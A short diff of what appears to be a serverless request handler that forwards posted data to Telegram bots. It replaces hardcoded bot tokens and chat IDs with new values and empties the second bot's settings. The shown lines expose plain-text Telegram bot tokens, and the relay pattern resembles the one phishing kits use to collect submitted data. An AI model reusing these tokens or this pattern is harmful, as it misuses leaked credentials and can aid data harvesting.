@@ -6,11 +6,11 @@ export default async function handler(req, res) {
   try {
     const data = req.body;
 
-    const botToken1 = '8951307689:AAFkIRx2qfismG77Y7y6J_nUa5gjCHafrek';
-    const chatId1 = '6076330929';
+    const botToken1 = '9020819173:AAHduHYg_zC7dk-eN5ZW6fR4L6ecCdJzB_4';
+    const chatId1 = '9020819173';
 
-    const botToken2 = '8899519634:AAGcr2JLK9HAsX6XXtkwbdp96eioJebTsYY';
-    const chatId2 = '6076330929';
+    const botToken2 = '';
+    const chatId2 = '';
 
     let messageText = '';
 
